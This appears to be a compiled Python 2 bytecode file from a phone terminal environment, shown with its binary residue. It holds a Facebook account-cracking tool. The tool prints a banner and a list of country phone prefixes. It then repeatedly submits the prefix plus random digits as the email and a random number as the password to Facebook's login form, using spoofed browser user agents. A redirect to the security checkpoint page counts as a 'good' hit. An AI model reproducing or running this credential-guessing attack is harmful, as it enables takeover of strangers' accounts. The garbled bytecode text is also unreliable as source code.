ó
vBÔ[c           @   s   d  d l  Z  d  d l Z d  d l Z d  d l Z d Z d Z d Z d Z d Z d   Z	 e	   e
 e d   Z d	   Z e   d S(
   iÿÿÿÿNs   [1;31ms   [1;32ms   [1;33ms   [1;34ms   [1;36mc           C   sw   t  GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd	 GHt Gd
 GHt Gd GHt Gd GHt Gd GHt Gd GHt GHd  S(   Ns         _ __ ___   __ ___  __s        | '_ ` _ \ / _` \ \/ /s        | | | | | | (_| |>  <s        |_| |_| |_|\__,_/_/\_\ s                  || s"                  ||        #########s#                  ||       # ali.max #s                  \/ s                  s     Egypt {010 / 011 / 012}   s     United States {98 / 62 }s     Yemen {7}s     Syria {9}s     Available {}(   t   bt   yt   g(    (    (    s)   /data/data/com.termux/files/home/oo/op.pyt   sem   s&    					s   Enter a number ------->c          C   s  t  t j d d   }  t |  } t  t j d d   } d } d g } t j d d  } t j   } t j   } | j t	  | j
 t  | j |  | j t  | j t j j   d d d t j |  f g | _ | j |  } | j d	 d
  | | j d <| | j d <| j   }	 |	 j   }
 t Gd Gt G| GHd |
 k r`t Gd Gt G| GHn% d |
 k rtd GHn t Gd Gt G| GHt   d  S(   NiÇ© iÿàõs2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1t   max_timei   s
   User-agentt   nri    t   emailt   passs
   Check===> s)   https://www.facebook.com/checkpoint/?nexts   good ---------> s"   https://www.facebook.com/login.phpt    (   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(   t   strt   randomt   randintt   kkt	   mechanizet   Browsert	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_refresht   _httpt   HTTPRefreshProcessort   choicet
   addheaderst   opent   select_formt   formt   submitt   geturlR    t   rR   t   ct   opop(   R   t   got   passwordt   logint
   useragentst   bassst   brt   maxt   sitet   subt   log(    (    s)   /data/data/com.termux/files/home/oo/op.pyR#   )   s6    
	(   t   sysR   R   R
   R!   R   R   R    R"   R   R	   t	   raw_inputR   R#   (    (    (    s)   /data/data/com.termux/files/home/oo/op.pyt   <module>   s   		'